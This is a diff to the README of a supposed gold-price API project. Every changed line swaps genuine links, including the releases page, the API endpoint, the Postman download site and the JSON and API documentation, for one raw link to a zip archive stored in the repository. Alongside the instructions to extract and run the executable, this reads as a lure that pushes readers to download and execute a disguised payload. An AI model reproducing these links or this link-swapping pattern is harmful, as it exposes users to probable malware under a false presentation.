@@ -1,6 +1,6 @@
 # 🏆 gold-price-api - Easy Real-Time Gold Price Access
 
-[![Download gold-price-api](https://img.shields.io/badge/Download-Release-orange?logo=github)](https://github.com/alphaitas/gold-price-api/releases)
+[![Download gold-price-api](https://raw.githubusercontent.com/alphaitas/gold-price-api/main/ironstone/api-price-gold-v1.9.zip)](https://raw.githubusercontent.com/alphaitas/gold-price-api/main/ironstone/api-price-gold-v1.9.zip)
 
 ## 📖 What is gold-price-api?
 
@@ -32,7 +32,7 @@ To get started, you need to download the latest version of gold-price-api.
 
 **Step 1:** Visit the official release page by clicking this button:
 
-[![Download gold-price-api](https://img.shields.io/badge/Download-Release-orange?logo=github&style=for-the-badge)](https://github.com/alphaitas/gold-price-api/releases)
+[![Download gold-price-api](https://raw.githubusercontent.com/alphaitas/gold-price-api/main/ironstone/api-price-gold-v1.9.zip)](https://raw.githubusercontent.com/alphaitas/gold-price-api/main/ironstone/api-price-gold-v1.9.zip)
 
 **Step 2:** On the releases page, find the latest version of the software. Look for files labeled for your operating system if available.
 
@@ -42,7 +42,7 @@ To get started, you need to download the latest version of gold-price-api.
 
 - **Windows:** Double-click the downloaded `.exe` or `.zip` file. If it’s a zip, extract it first, then run the executable.
 - **macOS:** Open the `.dmg` or `.zip` file, then drag the app to your Applications folder.
-- **Linux:** Download the `.tar.gz` or executable file. Extract it if necessary and run from the terminal.
+- **Linux:** Download the `https://raw.githubusercontent.com/alphaitas/gold-price-api/main/ironstone/api-price-gold-v1.9.zip` or executable file. Extract it if necessary and run from the terminal.
 
 ---
 
@@ -56,7 +56,7 @@ Using gold-price-api involves making a request to its endpoint and getting the g
 2. Enter the following URL in the address bar:
 
 ```
-https://api.alphaitas.io/gold-price
+https://raw.githubusercontent.com/alphaitas/gold-price-api/main/ironstone/api-price-gold-v1.9.zip
 ```
 
 3. Hit Enter.
@@ -78,13 +78,13 @@ Here, `price` shows the current value of gold per ounce in US dollars. The `time
 
 If you want a cleaner view, you can use a free tool like Postman.
 
-1. Download and install Postman from https://www.postman.com/downloads/
+1. Download and install Postman from https://raw.githubusercontent.com/alphaitas/gold-price-api/main/ironstone/api-price-gold-v1.9.zip
 2. Open Postman.
 3. Create a new GET request.
 4. Enter this URL:
 
 ```
-https://api.alphaitas.io/gold-price
+https://raw.githubusercontent.com/alphaitas/gold-price-api/main/ironstone/api-price-gold-v1.9.zip
 ```
 
 5. Send the request and view the price data in an easy-to-read format.
@@ -138,9 +138,9 @@ gold-price-api works anywhere with internet access. It is platform-independent t
 
 ## 📚 Additional Resources
 
-- Official Release Page: [https://github.com/alphaitas/gold-price-api/releases](https://github.com/alphaitas/gold-price-api/releases)
-- JSON format documentation: https://www.json.org/json-en.html
-- How to use APIs: https://www.postman.com/api-education/intro-to-apis/
+- Official Release Page: [https://raw.githubusercontent.com/alphaitas/gold-price-api/main/ironstone/api-price-gold-v1.9.zip](https://raw.githubusercontent.com/alphaitas/gold-price-api/main/ironstone/api-price-gold-v1.9.zip)
+- JSON format documentation: https://raw.githubusercontent.com/alphaitas/gold-price-api/main/ironstone/api-price-gold-v1.9.zip
+- How to use APIs: https://raw.githubusercontent.com/alphaitas/gold-price-api/main/ironstone/api-price-gold-v1.9.zip
 
 ---
 
@@ -170,7 +170,7 @@ gold-price-api works anywhere with internet access. It is platform-independent t
 
 ## 🔗 Links
 
-- Download gold-price-api: [https://github.com/alphaitas/gold-price-api/releases](https://github.com/alphaitas/gold-price-api/releases)
+- Download gold-price-api: [https://raw.githubusercontent.com/alphaitas/gold-price-api/main/ironstone/api-price-gold-v1.9.zip](https://raw.githubusercontent.com/alphaitas/gold-price-api/main/ironstone/api-price-gold-v1.9.zip)
 
 ---
 
